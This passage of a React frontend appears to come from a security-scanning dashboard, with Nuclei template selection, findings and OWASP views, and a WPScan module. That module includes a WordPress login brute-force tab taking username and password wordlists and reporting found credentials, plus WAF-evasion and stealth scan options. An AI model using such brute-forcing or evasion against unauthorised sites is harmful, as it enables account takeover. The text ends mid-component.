                <p className="text-xs font-mono font-bold text-accent-primary flex items-center gap-1.5">
                  <Globe size={11} /> Nuclei Templates
                  {nucleiCustomTemplates.length > 0 && (
                    <span className="ml-1 px-1.5 py-0.5 rounded bg-accent-primary bg-opacity-20 text-accent-primary text-xs">
                      {nucleiCustomTemplates.length} custom
                    </span>
                  )}
                </p>
                <button onClick={() => { setShowTemplateSearch(!showTemplateSearch); setTemplateSearch('') }}
                  className="text-xs font-mono text-text-muted hover:text-accent-primary transition-colors">
                  {showTemplateSearch ? 'Hide' : '+ Custom'}
                </button>
              </div>

              {/* Presets */}
              {nucleiCustomTemplates.length === 0 && (
                <div className="grid grid-cols-3 gap-1">
                  {([
                    { id: 'quick',    label: 'Quick',    desc: '~2 min',  info: '2 cats' },
                    { id: 'standard', label: 'Standard', desc: '~4 min',  info: '4 cats' },
                    { id: 'full',     label: 'Full',     desc: '~10 min', info: '7 cats' },
                  ] as const).map(p => (
                    <button key={p.id} onClick={() => setNucleiPreset(p.id)} disabled={scanning}
                      className={`p-2 rounded-lg border text-left transition-all disabled:opacity-50 ${
                        nucleiPreset === p.id
                          ? 'border-accent-primary bg-accent-primary bg-opacity-15'
                          : 'border-border-default hover:border-border-muted'
                      }`}>
                      <p className={`text-xs font-mono font-bold ${nucleiPreset === p.id ? 'text-accent-primary' : 'text-text-primary'}`}>{p.label}</p>
                      <p className="text-xs font-mono text-text-muted">{p.desc}</p>
                      <p className="text-xs font-mono text-text-muted opacity-60">{p.info}</p>
                    </button>
                  ))}
                </div>
              )}

              {/* Custom selected templates */}
              {nucleiCustomTemplates.length > 0 && (
                <div className="space-y-1">
                  <div className="flex flex-wrap gap-1">
                    {nucleiCustomTemplates.map(t => (
                      <span key={t} className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-accent-primary bg-opacity-15 text-accent-primary text-xs font-mono">
                        {t.split('/').pop()}
                        <button onClick={() => setNucleiCustomTemplates(prev => prev.filter(x => x !== t))}
                          className="hover:text-severity-critical ml-0.5">×</button>
                      </span>
                    ))}
                  </div>
                  <button onClick={() => setNucleiCustomTemplates([])}
                    className="text-xs font-mono text-text-muted hover:text-severity-critical transition-colors">
                    Clear all → use preset
                  </button>
                </div>
              )}

              {/* Template search/browser */}
              {showTemplateSearch && (
                <div className="space-y-2 pt-1 border-t border-border-default">
                  <input
                    value={templateSearch}
                    onChange={e => setTemplateSearch(e.target.value)}
                    placeholder="Search categories (e.g. cves, sqli, xss...)"
                    className="input-field font-mono text-xs"
                  />
                  <div className="max-h-48 overflow-y-auto space-y-1">
                    {Object.entries(nucleiTemplates as Record<string, any>)
                      .flatMap(([cat, info]) => {
                        const subs = info.subcategories as {name: string, count: number, path: string}[]
                        const items: {label: string, path: string, count: number}[] = []
                        // Add category itself
                        if (!templateSearch || cat.includes(templateSearch.toLowerCase())) {
                          items.push({ label: cat, path: cat, count: info.total })
                        }
                        // Add subcategories
                        subs.forEach(s => {
                          if (!templateSearch || s.name.includes(templateSearch.toLowerCase()) || cat.includes(templateSearch.toLowerCase())) {
                            items.push({ label: `${cat}/${s.name}`, path: s.path, count: s.count })
                          }
                        })
                        return items
                      })
                      .slice(0, 30)
                      .map(item => {
                        const selected = nucleiCustomTemplates.includes(item.path)
                        return (
                          <button key={item.path}
                            onClick={() => {
                              setNucleiCustomTemplates(prev =>
                                selected ? prev.filter(x => x !== item.path) : [...prev, item.path]
                              )
                            }}
                            className={`w-full flex items-center justify-between p-2 rounded-lg border text-left transition-all ${
                              selected
                                ? 'border-accent-primary bg-accent-primary bg-opacity-10'
                                : 'border-border-default hover:border-border-muted'
                            }`}>
                            <span className="text-xs font-mono text-text-primary">{item.label}</span>
                            <span className="text-xs font-mono text-text-muted">{item.count} templates</span>
                          </button>
                        )
                      })
                    }
                  </div>
                </div>
              )}
            </div>
          )}
          {/* Launch button */}
          <button
            onClick={scanning ? cancelScan : startScan}
            disabled={!target && !scanning}
            className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg font-mono text-sm font-bold transition-all disabled:opacity-50 ${
              scanning
                ? 'bg-severity-critical bg-opacity-20 border border-severity-critical text-severity-critical'
                : 'btn-primary'
            }`}>
            {scanning
              ? <><Square size={13} />Cancel Scan</>
              : <><Play size={13} />Launch Scan</>
            }
          </button>
        </div>

        {/* NVD Panel */}
        <NVDPanel />
      </div>

      {/* ── Right Panel ──────────────────────────────────────── */}
      <div className="flex-1 min-h-0 flex flex-col gap-3 min-w-0">

        {/* Tab bar */}
        <div className="flex items-center gap-2 flex-wrap">
          {[
            { id: 'findings', label: `Findings${displayFindings.length > 0 ? ` (${displayFindings.length})` : ''}`, icon: Shield },
            { id: 'history',  label: 'History', icon: Clock },
            { id: 'nvd',      label: 'OWASP Map', icon: BarChart3 },
          ].map(t => (
            <button key={t.id} onClick={() => { setViewMode(t.id as any); if (t.id !== 'history') setSelectedHistoryJob(null) }}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono border transition-all ${
                viewMode === t.id
                  ? 'border-accent-primary text-accent-primary bg-accent-primary bg-opacity-10'
                  : 'border-border-default text-text-muted hover:border-border-muted'
              }`}>
              <t.icon size={11} /> {t.label}
            </button>
          ))}

          {/* Progress */}
          {scanning && (
            <div className="flex items-center gap-2 ml-auto">
              <div className="w-24 h-1.5 bg-bg-tertiary rounded-full overflow-hidden">
                <div className="h-full bg-accent-primary rounded-full transition-all" style={{ width: `${progress}%` }} />
              </div>
              <span className="text-xs font-mono text-accent-primary animate-pulse">{progress}%</span>
            </div>
          )}
          {!scanning && summary && (
            <div className="ml-auto">
              <SeverityBar summary={summary} />
            </div>
          )}
        </div>

        {/* ── Findings View ─────────────────────────────────── */}
        {viewMode === 'findings' && (
          <div className="flex-1 min-h-0 flex flex-col gap-3">
            {/* Filters */}
            {displayFindings.length > 0 && (
              <div className="flex items-center gap-2 flex-wrap">
                <Filter size={12} className="text-text-muted" />
                <select value={filterSev} onChange={e => setFilterSev(e.target.value)} className="input-field text-xs py-1.5 w-32">
                  <option value="">All severity</option>
                  {Object.entries(SEV_META).map(([k, v]) => (
                    <option key={k} value={k}>{v.label}</option>
                  ))}
                </select>
                <select value={filterModule} onChange={e => setFilterModule(e.target.value)} className="input-field text-xs py-1.5 w-36">
                  <option value="">All modules</option>
                  {findingModules.map(m => (
                    <option key={m} value={m}>{m.replace('_', ' ')}</option>
                  ))}
                </select>
                {(filterSev || filterModule) && (
                  <button onClick={() => { setFilterSev(''); setFilterModule('') }}
                    className="text-xs font-mono text-text-muted hover:text-text-primary">
                    <X size={12} className="inline" /> Clear
                  </button>
                )}
                <span className="text-xs font-mono text-text-muted ml-auto">
                  {filteredFindings.length} / {displayFindings.length}
                </span>
              </div>
            )}

            {/* Terminal log (during scan) + findings */}
            <div className="flex-1 min-h-0 overflow-y-auto space-y-2">
              {/* Scan terminal */}
              {(scanning || scanLog.length > 0) && !selectedHistoryJob && (
                <div className="card p-3">
                  <div ref={logRef} className="h-32 overflow-y-auto font-mono text-xs space-y-0.5">
                    {scanLog.map((line, i) => (
                      <p key={i} className={
                        line.startsWith('[!!]') ? 'text-severity-critical' :
                        line.startsWith('[! ]') || line.startsWith('[+]') ? 'text-severity-low' :
                        line.startsWith('[-]') ? 'text-severity-critical' :
                        line.startsWith('[!]') ? 'text-severity-medium' :
                        line.startsWith('[=]') ? 'text-accent-primary' :
                        'text-text-muted'
                      }>{line || '\u00A0'}</p>
                    ))}
                    {scanning && <p className="text-accent-primary animate-pulse">▌</p>}
                  </div>
                </div>
              )}

              {filteredFindings.length === 0 && !scanning && (
                <div className="card p-12 text-center">
                  <Shield size={40} className="text-text-muted mx-auto mb-3" />
                  <p className="text-text-muted font-mono text-sm">
                    {displayFindings.length === 0
                      ? 'No scan results yet. Configure target and launch scan.'
                      : 'No findings match current filter.'}
                  </p>
                </div>
              )}

              {filteredFindings.map((f: Finding) => (
                <FindingCard key={f.id} finding={f} onToggleFP={(id) => fpMutation.mutate(id)} />
              ))}
            </div>
          </div>
        )}

        {/* ── History View ──────────────────────────────────── */}
        {viewMode === 'history' && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-2">
            {history.length === 0 ? (
              <div className="card p-12 text-center">
                <Clock size={40} className="text-text-muted mx-auto mb-3" />
                <p className="text-text-muted font-mono text-sm">No scan history yet.</p>
              </div>
            ) : (
              <>
                {selectedHistoryJob && (
                  <div className="flex items-center gap-2">
                    <button onClick={() => { setSelectedHistoryJob(null); setViewMode('history') }}
                      className="text-xs font-mono text-accent-primary flex items-center gap-1">
                      ← Back to history
                    </button>
                    <span className="text-xs font-mono text-text-muted">
                      Viewing: {history.find((j: ScanJob) => j.job_id === selectedHistoryJob)?.target}
                    </span>
                    {historyFindings && <SeverityBar summary={historyFindings.findings ? {
                      critical: historyFindings.findings.filter((f: Finding) => f.severity === 'critical').length,
                      high: historyFindings.findings.filter((f: Finding) => f.severity === 'high').length,
                      medium: historyFindings.findings.filter((f: Finding) => f.severity === 'medium').length,
                      low: historyFindings.findings.filter((f: Finding) => f.severity === 'low').length,
                      info: historyFindings.findings.filter((f: Finding) => f.severity === 'info').length,
                      total: historyFindings.count,
                    } : null} />}
                  </div>
                )}

                {!selectedHistoryJob && history.map((job: ScanJob) => (
                  <HistoryItem key={job.job_id} job={job} onSelect={() => {
                    setSelectedHistoryJob(job.job_id)
                    setViewMode('findings')
                  }} />
                ))}
              </>
            )}
          </div>
        )}

        {/* ── OWASP Map View ────────────────────────────────── */}
        {viewMode === 'nvd' && (
          <div className="flex-1 min-h-0 overflow-y-auto">
            <div className="card p-5 space-y-4">
              <h3 className="text-sm font-mono font-bold text-text-primary">OWASP Top 10 Coverage</h3>
              {displayFindings.length === 0 ? (
                <p className="text-text-muted text-sm font-mono text-center py-8">Run a scan to see OWASP mapping.</p>
              ) : (
                <div className="space-y-2">
                  {[
                    'A01:2021', 'A02:2021', 'A03:2021', 'A04:2021', 'A05:2021',
                    'A06:2021', 'A07:2021', 'A08:2021', 'A09:2021', 'A10:2021',
                  ].map(cat => {
                    const catFindings = displayFindings.filter((f: Finding) => f.owasp_category === cat)
                    const names: Record<string,string> = {
                      'A01:2021': 'Broken Access Control',
                      'A02:2021': 'Cryptographic Failures',
                      'A03:2021': 'Injection',
                      'A04:2021': 'Insecure Design',
                      'A05:2021': 'Security Misconfiguration',
                      'A06:2021': 'Vulnerable Components',
                      'A07:2021': 'Auth Failures',
                      'A08:2021': 'Integrity Failures',
                      'A09:2021': 'Logging Failures',
                      'A10:2021': 'SSRF',
                    }
                    const covered = catFindings.length > 0
                    return (
                      <div key={cat} className={`flex items-center gap-3 p-3 rounded-lg border ${covered ? 'border-severity-critical border-opacity-40 bg-severity-critical bg-opacity-5' : 'border-border-default'}`}>
                        <div className={`w-2 h-2 rounded-full flex-shrink-0 ${covered ? 'bg-severity-critical' : 'bg-bg-tertiary'}`} />
                        <div className="flex-1 min-w-0">
                          <p className="text-xs font-mono font-bold text-text-primary">{cat}</p>
                          <p className="text-xs font-mono text-text-muted">{names[cat]}</p>
                        </div>
                        {covered && (
                          <span className="text-xs font-mono text-severity-critical font-bold">
                            {catFindings.length} finding{catFindings.length > 1 ? 's' : ''}
                          </span>
                        )}
                      </div>
                    )
                  })}
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}



// ── WPScan Module ─────────────────────────────────────────────
function WPScanModule() {
  const [target, setTarget] = useState('')
  const [apiToken, setApiToken] = useState('')
  const [showToken, setShowToken] = useState(false)
  const [enumerate, setEnumerate] = useState('vp,vt,tt,cb,dbe,u,m')
  const [wpOptions, setWpOptions] = useState({
    randomUserAgent: true,
    disableTls: true,
    stealthy: false,
    forcePassiveDetection: false,
    wpContentDir: '',
    httpAuth: '',
    proxy: '',
  })
  const toggleOpt = (key: keyof typeof wpOptions) =>
    setWpOptions(prev => ({ ...prev, [key]: !prev[key] }))
  const [scanning, setScanning] = useState(false)
  const [result, setResult] = useState<any>(null)
  const [error, setError] = useState('')
  const [log, setLog] = useState<string[]>([])
  const [history, setHistory] = useState<{target: string, summary: any, findings: any[], date: string}[]>([])
  const [activeTab, setActiveTab] = useState<'scan'|'history'|'bruteforce'>('scan')
  const abortRef = useRef<AbortController | null>(null)
  const [bfUsernames, setBfUsernames] = useState('')
  const [bfWordlistType, setBfWordlistType] = useState<'common'|'rockyou_mini'|'custom'>('common')
  const [bfCustomPasswords, setBfCustomPasswords] = useState('')
  const [bfUploadedPasswords, setBfUploadedPasswords] = useState('')
  const [bfThreads, setBfThreads] = useState(5)
  const [bfRunning, setBfRunning] = useState(false)
  const [bfResults, setBfResults] = useState<any[]>([])
  const [bfLog, setBfLog] = useState<string[]>([])
  const [bfError, setBfError] = useState('')
  const bfFileRef = useRef<HTMLInputElement | null>(null)
  const bfUserFileRef = useRef<HTMLInputElement | null>(null)
  const addBfLog = (msg: string) => setBfLog(prev => [...prev, msg])

  const addLog = (msg: string) => setLog(prev => [...prev, msg])

  const cancelScan = () => {
    abortRef.current?.abort()
    setScanning(false)
    addLog('[!] Scan cancelled by user')
  }

  const runScan = async () => {
    if (!target.trim()) return
    setScanning(true)
    setResult(null)
    setError('')
    setLog([])
    setActiveTab('scan')
    const controller = new AbortController()
    abortRef.current = controller

    addLog(`[*] Target: ${target}`)
    addLog(`[*] Options: ${[
      wpOptions.randomUserAgent && 'random-ua',
      wpOptions.disableTls && 'no-tls',
      wpOptions.stealthy && 'stealthy',
      wpOptions.forcePassiveDetection && 'passive',
      wpOptions.proxy && 'proxy',
      wpOptions.httpAuth && 'http-auth',
    ].filter(Boolean).join(', ') || 'default'}`)
    addLog(`[*] Detecting WordPress...`)

    try {
      const res = await api.post('/scan-engine/wpscan/run', {
        target: target.trim(),
        api_token: apiToken.trim(),
        enumerate: enumerate,
        options: wpOptions,
      }, { signal: controller.signal })
      const data = res.data

      if (!data.is_wordpress) {
        addLog(`[-] Not a WordPress site`)
        addLog(data.error ? `[!] Error: ${data.error}` : `[i] No WordPress indicators found`)
        setResult(data)
      } else {
        addLog(`[+] WordPress detected!`)
        addLog(`[*] Running WPScan (enumerate: ${enumerate})...`)
        const s = data.summary || {}
        addLog(`[+] Scan complete — ${data.findings?.length || 0} findings`)
        if (s.critical) addLog(`  [CRITICAL] ${s.critical}`)
        if (s.high)     addLog(`  [HIGH]     ${s.high}`)
        if (s.medium)   addLog(`  [MEDIUM]   ${s.medium}`)
        if (s.low)      addLog(`  [LOW]      ${s.low}`)
        if (s.info)     addLog(`  [INFO]     ${s.info}`)
        setResult(data)
        // Save to history
        if (data.is_wordpress) {
          setHistory(prev => [{
            target: target.trim(),
            summary: data.summary,
            findings: data.findings || [],
            date: new Date().toLocaleString(),
          }, ...prev.slice(0, 19)])
        }
      }
    } catch (e: any) {
      if ((e as any)?.code === 'ERR_CANCELED') {
        addLog('[!] Scan cancelled')
        return
      }
      const msg = e.response?.data?.detail || e.message || 'Unknown error'
      setError(msg)
      addLog(`[!] Error: ${msg}`)
    } finally {
      setScanning(false)
      abortRef.current = null
    }
  }

  const SEV_COLOR: Record<string, string> = {
    critical: '#ff5f5f', high: '#ff9f43', medium: '#ffd43b', low: '#a9e34b', info: '#74c7ec'
  }

  return (
    <div className="h-full flex gap-4 min-h-0">
      {/* Left panel */}
      <div className="w-80 flex-shrink-0 flex flex-col gap-3">
        <div className="card p-4 space-y-3">
          <p className="text-xs font-mono font-bold text-accent-primary flex items-center gap-2">
            <Globe size={12} /> WordPress Scanner
          </p>

          {/* Target */}
          <div>
            <label className="text-xs font-mono text-text-muted mb-1 block">Target URL</label>
            <input
              value={target}
              onChange={e => setTarget(e.target.value)}
              onKeyDown={e => e.key === 'Enter' && !scanning && runScan()}
              className="input-field font-mono text-sm"
              placeholder="https://example.com"
              disabled={scanning}
            />
          </div>

          {/* API Token */}
          <div>
            <div className="flex items-center justify-between mb-1">
              <label className="text-xs font-mono text-text-muted">WPScan API Token</label>
              <span className="text-xs font-mono text-text-muted opacity-60">(optional)</span>
            </div>
            <div className="relative">
              <input
                value={apiToken}
                onChange={e => setApiToken(e.target.value)}
                type={showToken ? 'text' : 'password'}
                className="input-field font-mono text-sm pr-8"
                placeholder="API token for vuln data"
                disabled={scanning}
              />
              <button
                onClick={() => setShowToken(!showToken)}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-text-muted hover:text-text-primary">
                {showToken ? <EyeOff size={13} /> : <Eye size={13} />}
              </button>
            </div>
            <p className="text-xs font-mono text-text-muted opacity-60 mt-1">
              Get free token at wpscan.com
            </p>
          </div>

          {/* Enumerate options */}
          <div>
            <label className="text-xs font-mono text-text-muted mb-1 block">Scan Mode</label>
            <div className="grid grid-cols-1 gap-1">
              {([
                { label: 'Standard',     value: 'vp,vt,tt,cb,dbe,u,m', desc: 'Vulnerable plugins/themes, users' },
                { label: 'All Plugins',  value: 'ap,vt,tt,cb,dbe,u,m', desc: 'All plugins (slow ~5min)' },
                { label: 'All Themes',   value: 'vp,at,cb,dbe,u,m',    desc: 'All themes + vulnerable plugins' },
                { label: 'Full',         value: 'ap,at,tt,cb,dbe,u,m', desc: 'Everything (very slow ~15min)' },
                { label: 'Users Only',   value: 'u,m',                  desc: 'Fast user enumeration only' },
              ] as const).map(opt => (
                <button key={opt.value}
                  onClick={() => setEnumerate(opt.value)}
                  disabled={scanning}
                  className={`p-2 rounded-lg border text-left transition-all disabled:opacity-50 ${
                    enumerate === opt.value
                      ? 'border-accent-primary bg-accent-primary bg-opacity-10'
                      : 'border-border-default hover:border-border-muted'
                  }`}>
                  <div className="flex items-center justify-between">
                    <p className={`text-xs font-mono font-bold ${enumerate === opt.value ? 'text-accent-primary' : 'text-text-primary'}`}>
                      {opt.label}
                    </p>
                  </div>
                  <p className="text-xs font-mono text-text-muted opacity-70">{opt.desc}</p>
                </button>
              ))}
            </div>
          </div>

          {/* Advanced options */}
          <div>
            <label className="text-xs font-mono text-text-muted mb-2 block">Options</label>
            <div className="space-y-1.5">
              {([
                { key: 'randomUserAgent',       label: 'Random User-Agent',         desc: 'Bypass WAF/detection (recommended)' },
                { key: 'disableTls',            label: 'Disable TLS Checks',        desc: 'Allow self-signed certs' },
                { key: 'stealthy',              label: 'Stealthy Mode',             desc: 'Slow scan, avoid detection' },
                { key: 'forcePassiveDetection', label: 'Passive Detection Only',    desc: 'No aggressive checks' },
              ] as const).map(opt => (
                <label key={opt.key}
                  className="flex items-start gap-2 p-2 rounded-lg border border-border-default hover:border-border-muted cursor-pointer transition-all">
                  <div className="relative flex-shrink-0 mt-0.5">
                    <input type="checkbox"
                      checked={wpOptions[opt.key] as boolean}
                      onChange={() => toggleOpt(opt.key)}
                      disabled={scanning}
                      className="sr-only" />
                    <div className={`w-3.5 h-3.5 rounded border flex items-center justify-center transition-all ${
                      wpOptions[opt.key]
                        ? 'bg-accent-primary border-accent-primary'
                        : 'border-border-muted bg-transparent'
                    }`}>
                      {wpOptions[opt.key] && <CheckCircle size={10} className="text-bg-primary" />}
                    </div>
                  </div>
                  <div className="min-w-0">
                    <p className="text-xs font-mono text-text-primary">{opt.label}</p>
                    <p className="text-xs font-mono text-text-muted opacity-60">{opt.desc}</p>
                  </div>
                </label>
              ))}

              {/* HTTP Auth */}
              <div className="p-2 rounded-lg border border-border-default space-y-1">
                <p className="text-xs font-mono text-text-muted">HTTP Basic Auth</p>
                <input
                  value={wpOptions.httpAuth}
                  onChange={e => setWpOptions(p => ({...p, httpAuth: e.target.value}))}
                  placeholder="user:password"
                  disabled={scanning}
                  className="input-field font-mono text-xs" />
              </div>

              {/* Proxy */}
              <div className="p-2 rounded-lg border border-border-default space-y-1">
                <p className="text-xs font-mono text-text-muted">Proxy</p>
                <input
                  value={wpOptions.proxy}
                  onChange={e => setWpOptions(p => ({...p, proxy: e.target.value}))}
                  placeholder="http://127.0.0.1:8080"
                  disabled={scanning}
                  className="input-field font-mono text-xs" />
              </div>

              {/* Custom wp-content dir */}
              <div className="p-2 rounded-lg border border-border-default space-y-1">
                <p className="text-xs font-mono text-text-muted">Custom wp-content path</p>
                <input
                  value={wpOptions.wpContentDir}
                  onChange={e => setWpOptions(p => ({...p, wpContentDir: e.target.value}))}
                  placeholder="/wp-content (default)"
                  disabled={scanning}
                  className="input-field font-mono text-xs" />
              </div>
            </div>
          </div>

          {/* Timeout warning for slow modes */}
          {(enumerate.startsWith('ap') || enumerate.includes(',at,')) && !scanning && (
            <div className="p-2 rounded-lg border border-severity-medium bg-severity-medium bg-opacity-5">
              <p className="text-xs font-mono text-severity-medium">
                ⚠ {enumerate.includes('at') && enumerate.includes('ap') ? 'Full scan may take up to 15 min' : 'All plugins/themes scan may take 5-10 min'}
              </p>
            </div>
          )}

          {/* Scan button */}
          <div className="flex gap-2">
            <button
              onClick={scanning ? cancelScan : runScan}
              disabled={!target && !scanning}
              className={`flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg font-mono text-sm font-bold transition-all disabled:opacity-50 ${
                scanning
                  ? 'bg-severity-critical bg-opacity-20 border border-severity-critical text-severity-critical'
                  : 'btn-primary'
              }`}>
              {scanning
                ? <><X size={13} /> Cancel</>
                : <><Search size={13} /> Scan WordPress</>
              }
            </button>
          </div>
        </div>

        {/* Info box */}
        <div className="card p-3 space-y-2">
          <p className="text-xs font-mono font-bold text-text-muted">What it checks</p>
          {[
            ['WordPress Detection', 'wp-content, wp-includes, login page'],
            ['Version', 'Core version & known CVEs'],
            ['Plugins', 'Vulnerable plugin versions'],
            ['Themes', 'Theme vulnerabilities'],
            ['Users', 'Username enumeration'],
            ['Misconfigs', 'Debug mode, exposed files'],
          ].map(([title, desc]) => (
            <div key={title} className="flex gap-2">
              <CheckCircle size={11} className="text-accent-primary flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-xs font-mono text-text-primary">{title}</p>
                <p className="text-xs font-mono text-text-muted opacity-70">{desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Right panel */}
      <div className="flex-1 min-h-0 flex flex-col gap-3">
        {/* Tabs */}
        <div className="flex gap-1 flex-shrink-0">
          {([
            { id: 'scan',       label: 'Scan' },
            { id: 'bruteforce', label: '⚔ Bruteforce' },
            { id: 'history',    label: `History (${history.length})` },
          ] as const).map(tabItem => (
            <button key={tabItem.id} onClick={() => setActiveTab(tabItem.id as any)}
              className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                activeTab === tabItem.id
                  ? 'bg-accent-primary bg-opacity-20 text-accent-primary border border-accent-primary border-opacity-40'
                  : 'text-text-muted hover:text-text-primary border border-transparent'
              }`}>
              {tabItem.label}
            </button>
          ))}
        </div>

        {/* History tab */}
        {activeTab === 'history' && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-2">
            {history.length === 0 ? (
              <div className="card p-6 text-center">
                <p className="text-text-muted font-mono text-xs">No scan history yet</p>
              </div>
            ) : history.map((h, i) => (
              <div key={i} className="card p-3 space-y-2 cursor-pointer hover:border-border-muted transition-all"
                onClick={() => {
                  setResult({ is_wordpress: true, target: h.target, findings: h.findings, summary: h.summary })
                  setActiveTab('scan')
                }}>
                <div className="flex items-center justify-between">
                  <p className="text-xs font-mono font-bold text-text-primary truncate">{h.target}</p>
                  <p className="text-xs font-mono text-text-muted flex-shrink-0 ml-2">{h.date}</p>
                </div>
                <div className="flex gap-2">
                  {(['critical','high','medium','low','info'] as const).map(s => h.summary?.[s] > 0 && (
                    <span key={s} className="text-xs font-mono px-1.5 py-0.5 rounded"
                      style={{ background: ({critical:'#ff5f5f',high:'#ff9f43',medium:'#ffd43b',low:'#a9e34b',info:'#74c7ec'} as any)[s]+'20',
                               color: ({critical:'#ff5f5f',high:'#ff9f43',medium:'#ffd43b',low:'#a9e34b',info:'#74c7ec'} as any)[s] }}>
                      {h.summary[s]} {s}
                    </span>
                  ))}
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Bruteforce tab */}
        {activeTab === 'bruteforce' && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-3">
            {/* Config */}
            <div className="card p-4 space-y-3">
              <p className="text-xs font-mono font-bold text-severity-high flex items-center gap-2">
                ⚔ WordPress Bruteforce
              </p>

              {/* Target display */}
              <div className="p-2 rounded-lg bg-bg-tertiary">
                <p className="text-xs font-mono text-text-muted">Target: <span className="text-accent-primary">{target || 'set target in left panel'}</span></p>
              </div>

              {/* Usernames */}
              <div>
                <div className="flex items-center justify-between mb-1">
                  <label className="text-xs font-mono text-text-muted">
                    Usernames <span className="opacity-60">(comma separated)</span>
                  </label>
                  <button
                    onClick={() => bfUserFileRef.current?.click()}
                    disabled={bfRunning}
                    className="text-xs font-mono text-text-muted hover:text-accent-primary transition-colors flex items-center gap-1">
                    ↑ Upload list
                  </button>
                </div>
                <input
                  value={bfUsernames}
                  onChange={e => setBfUsernames(e.target.value)}
                  placeholder="admin, editor, siswatisisi"
                  disabled={bfRunning}
                  className="input-field font-mono text-xs"
                />
                <input ref={bfUserFileRef} type="file" accept=".txt" className="hidden"
                  onChange={e => {
                    const file = e.target.files?.[0]
                    if (!file) return
                    const reader = new FileReader()
                    reader.onload = ev => {
                      const text = ev.target?.result as string || ''
                      // Convert newlines to comma separated
                      const users = text.split('\n').map(u => u.trim()).filter(Boolean).join(', ')
                      setBfUsernames(users)
                    }
                    reader.readAsText(file)
                  }}
                />
                {bfUsernames && (
                  <p className="text-xs font-mono text-text-muted opacity-60 mt-1">
                    {bfUsernames.split(',').filter(s => s.trim()).length} username(s)
                  </p>
                )}
              </div>

              {/* Wordlist type */}
              <div>
                <label className="text-xs font-mono text-text-muted mb-2 block">Password Wordlist</label>
                <div className="grid grid-cols-3 gap-1 mb-2">
                  {([
                    { id: 'common',      label: 'Common',      desc: '32 passwords', count: 32 },
                    { id: 'rockyou_mini',label: 'RockYou Mini',desc: '48 passwords', count: 48 },
                    { id: 'custom',      label: 'Custom',      desc: 'Manual / Upload', count: 0 },
                  ] as const).map(w => (
                    <button key={w.id} onClick={() => setBfWordlistType(w.id)} disabled={bfRunning}
                      className={`p-2 rounded-lg border text-left transition-all disabled:opacity-50 ${
                        bfWordlistType === w.id
                          ? 'border-severity-high bg-severity-high bg-opacity-10'
                          : 'border-border-default hover:border-border-muted'
                      }`}>
                      <p className={`text-xs font-mono font-bold ${bfWordlistType === w.id ? 'text-severity-high' : 'text-text-primary'}`}>{w.label}</p>
                      <p className="text-xs font-mono text-text-muted opacity-70">{w.desc}</p>
                    </button>
                  ))}
                </div>

                {bfWordlistType === 'custom' && (
                  <div className="space-y-2">
                    <textarea
                      value={bfCustomPasswords}
                      onChange={e => setBfCustomPasswords(e.target.value)}
                      placeholder="password1&#10;password2&#10;admin123&#10;(one per line)"
                      disabled={bfRunning}
                      rows={5}
                      className="input-field font-mono text-xs w-full resize-none"
                    />
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => bfFileRef.current?.click()}
                        disabled={bfRunning}
                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-border-default hover:border-border-muted text-xs font-mono text-text-muted transition-all">
                        ↑ Upload wordlist
                      </button>
                      {bfUploadedPasswords && (
                        <span className="text-xs font-mono text-accent-primary">
                          {bfUploadedPasswords.split('\n').filter(Boolean).length} passwords loaded
                        </span>
                      )}
                      <input ref={bfFileRef} type="file" accept=".txt" className="hidden"
                        onChange={e => {
                          const file = e.target.files?.[0]
                          if (!file) return
                          const reader = new FileReader()
                          reader.onload = ev => {
                            setBfUploadedPasswords(ev.target?.result as string || '')
                            setBfCustomPasswords(ev.target?.result as string || '')
                          }
                          reader.readAsText(file)
                        }}
                      />
                    </div>
                  </div>
                )}
              </div>

              {/* Threads */}
              <div className="flex items-center gap-3">
                <label className="text-xs font-mono text-text-muted">Threads:</label>
                {[1,3,5,10].map(t => (
                  <button key={t} onClick={() => setBfThreads(t)} disabled={bfRunning}
                    className={`px-2 py-1 rounded text-xs font-mono transition-all ${
                      bfThreads === t
                        ? 'bg-accent-primary bg-opacity-20 text-accent-primary'
                        : 'text-text-muted hover:text-text-primary'
                    }`}>{t}</button>
                ))}
              </div>

              {/* Start button */}
              <button
                onClick={async () => {
                  if (!target.trim()) { setBfError('Set target URL first'); return }
                  const usernames = bfUsernames.split(',').map(u => u.trim()).filter(Boolean)
                  if (!usernames.length) { setBfError('Enter at least one username'); return }
                  const passwords = bfWordlistType === 'custom'
                    ? bfCustomPasswords.split('\n').map(p => p.trim()).filter(Boolean)
                    : []
                  if (bfWordlistType === 'custom' && !passwords.length) {
                    setBfError('Enter passwords or upload wordlist')
                    return
                  }
                  setBfRunning(true)
                  setBfResults([])
                  setBfError('')
                  setBfLog([])
                  addBfLog(`[*] Target: ${target}`)
                  addBfLog(`[*] Usernames: ${usernames.join(', ')}`)
                  addBfLog(`[*] Wordlist: ${bfWordlistType}${passwords.length ? ` (${passwords.length} passwords)` : ''}`)
                  addBfLog(`[*] Threads: ${bfThreads}`)
                  addBfLog(`[*] Running bruteforce...`)
                  try {
                    const res = await api.post('/scan-engine/wpscan/bruteforce', {
                      target: target.trim(),
                      usernames,
                      passwords,
                      wordlist_type: bfWordlistType,
                      threads: bfThreads,
                      api_token: apiToken,
                    })
                    const d = res.data
                    addBfLog(`[+] Tested ${d.passwords_tested} passwords`)
                    if (d.found > 0) {
                      addBfLog(`[+] FOUND ${d.found} credential(s)!`)
                      d.results.forEach((r: any) => addBfLog(`  ✓ ${r.username}:${r.password}`))
                    } else {
                      addBfLog(`[-] No credentials found`)
                    }
                    setBfResults(d.results || [])
                    if (d.error) setBfError(d.error)
                  } catch(e: any) {
                    const msg = e.response?.data?.detail || e.message
                    setBfError(msg)
                    addBfLog(`[!] Error: ${msg}`)
                  } finally {
                    setBfRunning(false)
                  }
                }}
                disabled={bfRunning || !target}
